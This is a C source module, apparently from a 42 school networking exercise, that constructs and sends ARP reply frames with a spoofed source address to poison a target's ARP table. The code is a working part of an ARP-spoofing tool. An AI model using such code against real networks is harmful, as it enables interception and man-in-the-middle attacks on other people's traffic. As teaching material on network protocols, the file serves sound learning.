/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   arp_sender.c                                       :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: dylan <dylan@student.42.fr>                +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2025/11/08 15:13:26 by dylan             #+#    #+#             */
/*   Updated: 2025/11/10 14:37:26 by dylan            ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "core/arp_sender.h"
#include "domain/ip_address.h"
#include "infrastructure/iface/iface.h"
#include "infrastructure/log/logger.h"
#include "infrastructure/net/arp_printer.h"
#include "infrastructure/net/arp_serializer.h"
#include "libft.h"
#include <errno.h>
#include <net/if_arp.h>
#include <netinet/if_ether.h>
#include <string.h>

static void	create_arp_response(t_arp_context *ctx, t_arp_frame *arp_response)
{
	ft_memset(arp_response, 0, sizeof(t_arp_frame));
	arp_response->header_arp.ar_pro = ETH_P_IP;
	arp_response->header_arp.ar_hln = ETH_ALEN;
	arp_response->header_arp.ar_pln = IP4LEN;
	arp_response->header_arp.ar_hrd = ARPHRD_ETHER;
	arp_response->header_arp.ar_op = ARPOP_REPLY;
	ft_memcpy(arp_response->src_mac.bytes, ctx->config->src_mac.bytes,
		sizeof(arp_response->src_mac.bytes));
	ft_memcpy(arp_response->tgt_mac.bytes, ctx->config->tgt_mac.bytes,
		sizeof(arp_response->tgt_mac.bytes));
	ft_memcpy(&arp_response->src_ip, &ctx->config->src_ip.addr.s_addr,
		sizeof(arp_response->src_ip));
	ft_memcpy(&arp_response->tgt_ip, &ctx->config->tgt_ip.addr.s_addr,
		sizeof(arp_response->tgt_ip));
}

static bool	error_strategy(t_iface_status status)
{
	log_error("Failed to send ARP reply packet: %s", iface_strerror(status));
	return (false);
}

static bool	success_strategy(t_arp_context *ctx, t_arp_frame *arp_response)
{
	log_info("Sent an ARP reply packet, check the arp table on the target.");
	ctx->config->once = true;
	if (ctx->config->verbose)
		print_arp_frame(arp_response);
	return (true);
}

bool	send_arp_frame(t_arp_context *ctx)
{
	t_arp_frame		arp_response;
	unsigned char	raw_frame[128];
	t_iface_status	sending_status;

	create_arp_response(ctx, &arp_response);
	serialize_arp_frame(&arp_response, raw_frame);
	log_info("Now sending an ARP reply to the\
 target address with spoofed source.");
	sending_status = iface_send(ctx->iface, raw_frame, 42);
	if (sending_status != IFACE_SEND_SUCCESS)
		return (error_strategy(sending_status));
	return (success_strategy(ctx, &arp_response));
}
